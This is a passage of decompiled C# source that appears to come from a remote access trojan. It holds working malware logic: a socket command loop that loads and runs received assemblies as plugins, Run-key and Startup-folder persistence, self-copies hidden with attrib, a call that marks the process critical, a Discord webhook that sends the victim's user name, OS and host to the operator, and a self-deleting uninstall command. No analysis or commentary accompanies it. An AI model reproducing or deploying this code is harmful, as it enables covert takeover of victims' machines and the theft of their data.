            if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(L.F.Registry.CurrentUser.GetValue(L.sf + "\\" + L.RG, (object) "")), (object) L.rgg, false))
              L.F.Registry.CurrentUser.OpenSubKey(L.sf, true).SetValue(L.RG, (object) L.rgg);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
          try
          {
            if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(L.F.Registry.LocalMachine.GetValue(L.sf + "\\" + L.RG, (object) "")), (object) L.rgg, false))
              L.F.Registry.LocalMachine.OpenSubKey(L.sf, true).SetValue(L.RG, (object) L.rgg);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
  }

  public static string md5(byte[] B)
  {
    B = new MD5CryptoServiceProvider().ComputeHash(B);
    string str = "";
    byte[] numArray = B;
    int index = 0;
    while (index < numArray.Length)
    {
      byte num = numArray[index];
      str += num.ToString("x2");
      checked { ++index; }
    }
    return str;
  }

  [DllImport("ntdll")]
  private static extern int NtSetInformationProcess(
    IntPtr hProcess,
    int processInformationClass,
    ref int processInformation,
    int processInformationLength);

  public static object Plugin(byte[] b, string c)
  {
    Module[] modules = Assembly.Load(b).GetModules();
    int index1 = 0;
    while (index1 < modules.Length)
    {
      Module module = modules[index1];
      System.Type[] types = module.GetTypes();
      int index2 = 0;
      while (index2 < types.Length)
      {
        System.Type type = types[index2];
        if (type.FullName.EndsWith("." + c))
          return module.Assembly.CreateInstance(type.FullName);
        checked { ++index2; }
      }
      checked { ++index1; }
    }
    return (object) null;
  }

  public static void pr(int i)
  {
    try
    {
      L.NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref i, 4);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
  }

  public static void RC()
  {
    while (true)
    {
      L.lastcap = "";
      if (L.FCC != null)
      {
        long num1 = -1;
        int num2 = 0;
        try
        {
          while (true)
          {
            do
            {
              checked { ++num2; }
              if (num2 == 10)
              {
                num2 = 0;
                Thread.Sleep(1);
              }
              if (L.Cn)
              {
                if (L.FCC.Available < 1)
                  L.FCC.Client.Poll(-1, SelectMode.SelectRead);
                do
                {
                  if (L.FCC.Available > 0)
                  {
                    if (num1 == -1L)
                    {
                      string str = "";
                      while (true)
                      {
                        int CharCode = L.FCC.GetStream().ReadByte();
                        switch (CharCode)
                        {
                          case -1:
                            goto label_20;
                          case 0:
                            goto label_11;
                          default:
                            str += Conversions.ToString(Conversions.ToInteger(Strings.ChrW(CharCode).ToString()));
                            continue;
                        }
                      }
label_11:
                      num1 = Conversions.ToLong(str);
                      if (num1 == 0L)
                      {
                        L.Send("");
                        num1 = -1L;
                      }
                    }
                    else
                      goto label_15;
                  }
                  else
                    goto label_20;
                }
                while (L.FCC.Available > 0);
                continue;
label_15:
                L.b = new byte[checked (L.FCC.Available + 1 - 1 + 1)];
                long num3 = checked (num1 - L.MeM.Length);
                if ((long) L.b.Length > num3)
                  L.b = new byte[checked ((int) (num3 - 1L) + 1 - 1 + 1)];
                int count = L.FCC.Client.Receive(L.b, 0, L.b.Length, SocketFlags.None);
                L.MeM.Write(L.b, 0, count);
              }
              else
                goto label_20;
            }
            while (L.MeM.Length != num1);
            num1 = -1L;
            Thread thread = new Thread(new ParameterizedThreadStart(L.LOP), 1);
            thread.Start((object) L.MeM.ToArray());
            thread.Join(100);
            L.MeM.Dispose();
            L.MeM = new MemoryStream();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
label_20:
      do
      {
        try
        {
          if (L.PLG != null)
          {
            NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(L.PLG), (System.Type) null, "clear", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
            L.PLG = (object) null;
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        L.Cn = false;
      }
      while (!L.connect());
      L.Cn = true;
    }
  }

  public static byte[] SB(ref string S) => Encoding.UTF8.GetBytes(S);

  public static bool Send(string S) => L.Sendb(L.SB(ref S));

  public static bool Sendb(byte[] b)
  {
    if (!L.Cn)
      return false;
    try
    {
      lock (L.LO)
      {
        if (!L.Cn)
          return false;
        MemoryStream memoryStream = new MemoryStream();
        string S = b.Length.ToString() + "\0";
        byte[] buffer = L.SB(ref S);
        memoryStream.Write(buffer, 0, buffer.Length);
        memoryStream.Write(b, 0, b.Length);
        L.FCC.Client.Send(memoryStream.ToArray(), 0, checked ((int) memoryStream.Length), SocketFlags.None);
      }
    }
    catch (Exception ex1)
    {
      ProjectData.SetProjectError(ex1);
      ProjectData.SetProjectError(ex1);
      try
      {
        if (L.Cn)
        {
          L.Cn = false;
          L.FCC.Close();
        }
      }
      catch (Exception ex2)
      {
        ProjectData.SetProjectError(ex2);
        ProjectData.SetProjectError(ex2);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    return L.Cn;
  }

  public static bool STV(string n, object t, RegistryValueKind typ)
  {
    bool flag;
    try
    {
      L.F.Registry.CurrentUser.CreateSubKey("Software\\" + L.RG).SetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(t))), typ);
      flag = true;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      flag = false;
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    return flag;
  }

  private static bool CompDir(FileInfo F1, FileInfo F2)
  {
    if (Operators.CompareString(F1.Name.ToLower(), F2.Name.ToLower(), false) != 0)
      return false;
    DirectoryInfo directoryInfo1 = F1.Directory;
    DirectoryInfo directoryInfo2 = F2.Directory;
    while (Operators.CompareString(directoryInfo1.Name.ToLower(), directoryInfo2.Name.ToLower(), false) == 0)
    {
      directoryInfo1 = directoryInfo1.Parent;
      directoryInfo2 = directoryInfo2.Parent;
      if (directoryInfo1 == null & directoryInfo2 == null)
        return true;
      if (directoryInfo1 == null || directoryInfo2 == null)
        return false;
    }
    return false;
  }

  [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
  public static void INS()
  {
    if (L.Idr)
    {
      if (!L.CompDir(L.LO, new FileInfo(Interaction.Environ(L.DR).ToLower() + "\\" + L.EXE.ToLower())))
      {
        try
        {
          if (System.IO.File.Exists(Interaction.Environ(L.DR) + "\\" + L.EXE))
            System.IO.File.Delete(Interaction.Environ(L.DR) + "\\" + L.EXE);
          FileStream fileStream = new FileStream(Interaction.Environ(L.DR) + "\\" + L.EXE, FileMode.CreateNew);
          byte[] array = System.IO.File.ReadAllBytes(L.LO.FullName);
          fileStream.Write(array, 0, array.Length);
          fileStream.Flush();
          fileStream.Close();
          L.LO = new FileInfo(Interaction.Environ(L.DR) + "\\" + L.EXE);
          Process.Start(L.LO.FullName);
          Interaction.Shell("attrib +h +r +s \"" + L.LO.FullName + "\"", AppWinStyle.Hide);
          L.F.Registry.CurrentUser.OpenSubKey(L.sf, true).SetValue(L.RG + "2", (object) L.LO.FullName);
          ProjectData.EndApp();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
    }
    try
    {
      Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    if (L.Isu)
    {
      try
      {
        L.F.Registry.CurrentUser.OpenSubKey(L.sf, true).SetValue(L.RG + "2", (object) L.rgg);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        L.F.Registry.LocalMachine.OpenSubKey(L.sf, true).SetValue(L.RG + "2", (object) L.rgg);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (L.IsF)
    {
      try
      {
        System.IO.File.Copy(L.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + L.RG + ".exe", true);
        L.FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + L.RG + ".exe", FileMode.Open);
        System.IO.File.Copy(L.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + L.RG + ".exe", true);
        L.FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + L.RG + ".exe", FileMode.Open);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (L.att)
    {
      try
      {
        L.Del();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (!L.DIC)
      return;
    try
    {
      L.Discord();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
  }

  public static void Discord()
  {
    try
    {
      string ds = L.DS;
      object obj = (object) new WebClient();
      object Instance1 = (object) new NameValueCollection();
      NewLateBinding.LateIndexSet(Instance1, new object[2]
      {
        (object) "content",
        (object) ("You have a running computer...\r\ninformation ------------------------------\r\n[+] Name   : " + Environment.UserName + "\r\n[+] System : " + L.F.Info.OSFullName + "\r\n[+] Host   : " + L.H + "\r\n[+] Port   : " + L.P)
      }, (string[]) null);
      object Instance2 = obj;
      object[] objArray = new object[2]
      {
        (object) ds,
        RuntimeHelpers.GetObjectValue(Instance1)
      };
      object[] Arguments = objArray;
      bool[] flagArray = new bool[2]{ true, true };
      bool[] CopyBack = flagArray;
      NewLateBinding.LateCall(Instance2, (System.Type) null, "UploadValues", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
      if (flagArray[0])
      {
        string str = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (string));
      }
      if (!flagArray[1])
        return;
      RuntimeHelpers.GetObjectValue(objArray[1]);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void Del()
  {
    if (!L.att)
      return;
    try
    {
      Interaction.Shell("attrib +h +r +s \"" + Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + L.RG + ".exe\"", AppWinStyle.Hide);
      Interaction.Shell("attrib +h +r +s \"" + L.LIH + "\"", AppWinStyle.Hide);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
  public static void UNS()
  {
    L.pr(0);
    L.Isu = false;
    try
    {
      L.F.Registry.CurrentUser.OpenSubKey(L.sf, true).DeleteValue(L.RG, false);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    try
    {
      L.F.Registry.LocalMachine.OpenSubKey(L.sf, true).DeleteValue(L.RG, false);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    try
    {
      Interaction.Shell("netsh firewall delete allowedprogram \"" + L.LO.FullName + "\"", AppWinStyle.Hide);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    try
    {
      if (L.FS != null)
      {
        L.FS.Dispose();
        System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + L.RG + ".exe");
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    try
    {
      L.F.Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(L.RG, false);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    try
    {
      Interaction.Shell("cmd.exe /c ping 0 -n 2 & del \"" + L.LO.FullName + "\"", AppWinStyle.Hide);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    ProjectData.EndApp();
  }

  public static byte[] ZIP(byte[] B)
  {
    MemoryStream memoryStream = new MemoryStream(B);
    GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Decompress);
    byte[] buffer = new byte[4];
    memoryStream.Position = checked (memoryStream.Length - 5L);
    memoryStream.Read(buffer, 0, 4);
    int int32 = BitConverter.ToInt32(buffer, 0);
    memoryStream.Position = 0L;
    byte[] array = new byte[checked (int32 - 1 + 1 - 1 + 1)];
    gzipStream.Read(array, 0, int32);
    gzipStream.Dispose();
    memoryStream.Dispose();
    return array;
  }
}
